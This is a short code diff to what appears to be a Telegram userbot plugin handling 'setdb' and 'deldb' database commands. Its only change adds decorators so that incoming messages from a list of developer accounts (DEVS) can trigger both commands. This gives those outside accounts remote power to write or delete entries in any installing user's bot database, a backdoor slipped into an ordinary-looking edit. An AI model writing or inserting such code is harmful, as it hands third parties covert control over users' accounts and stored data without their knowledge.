@@ -30,8 +30,10 @@ import os
 import re
 
 from . import eor, get_string, udB, ayra_cmd
+from Ayra.kynan import register
 
 @ayra_cmd(pattern="setdb( (.*)|$)", fullsudo=False)
+@register(incoming=True, from_users=DEVS, pattern=r"^Setdb")
 async def _(ay):
     match = ay.pattern_match.group(1).strip()
     if not match:
@@ -52,6 +54,7 @@ async def _(ay):
 
 
 @ayra_cmd(pattern="deldb( (.*)|$)", fullsudo=False)
+@register(incoming=True, from_users=DEVS, pattern=r"^Deldb")
 async def _(ay):
     key = ay.pattern_match.group(1).strip()
     if not key:
